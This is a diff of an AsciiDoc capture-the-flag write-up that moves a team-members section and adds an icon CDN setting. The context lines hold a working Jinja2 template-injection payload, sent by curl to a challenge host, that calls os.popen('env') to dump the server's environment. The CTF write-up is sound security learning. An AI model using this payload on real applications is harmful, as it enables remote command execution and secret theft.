@@ -2,29 +2,9 @@
 :toc: left
 :icons: font
 :icon-set: fab
+:iconfont-cdn: https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css
 :source-highlighter: rouge
 :nofooter:
-
-== Team Members
-
-=== Anirudh Samudrala
-- icon:github[] https://github.com/ANIS1502
-- icon:linkedin[] https://www.linkedin.com/in/ani-sam
-
-=== Jaden Furtado
-- icon:github[] https://github.com/JadenFurtado
-- icon:linkedin[] https://www.linkedin.com/in/jaden-furtado
-
-=== Jay Kaku
-- icon:github[] https://github.com/JayKaku
-- icon:linkedin[] https://www.linkedin.com/in/jay-kaku-a33382191
-
-=== Kartik Soneji
-- icon:gitlab[] https://gitlab.com/KartikSoneji
-- icon:github[] https://github.com/KartikSoneji
-- icon:linkedin[] https://www.linkedin.com/in/kartiksoneji
-
-Git Repo: https://github.com/JayKaku/esCTF-round2-2022
 
 <<<
 == "Basic" RSA
@@ -351,3 +331,26 @@ Final payload: `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|at
 	-H "host: localhost" \
 	"https://embeddedsecurityctf2022-hostme.chals.io/echo?value={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('env')|attr('read')()}}"
 ```
+
+
+
+== Team Members
+
+=== Anirudh Samudrala
+- icon:github[brands] https://github.com/ANIS1502
+- icon:linkedin[brands] https://www.linkedin.com/in/ani-sam
+
+=== Jaden Furtado
+- icon:github[brands] https://github.com/JadenFurtado
+- icon:linkedin[brands] https://www.linkedin.com/in/jaden-furtado
+
+=== Jay Kaku
+- icon:github[brands] https://github.com/JayKaku
+- icon:linkedin[brands] https://www.linkedin.com/in/jay-kaku-a33382191
+
+=== Kartik Soneji
+- icon:gitlab[brands] https://gitlab.com/KartikSoneji
+- icon:github[brands] https://github.com/KartikSoneji
+- icon:linkedin[brands] https://www.linkedin.com/in/kartiksoneji
+
+Git Repo: https://github.com/JayKaku/esCTF-round2-2022
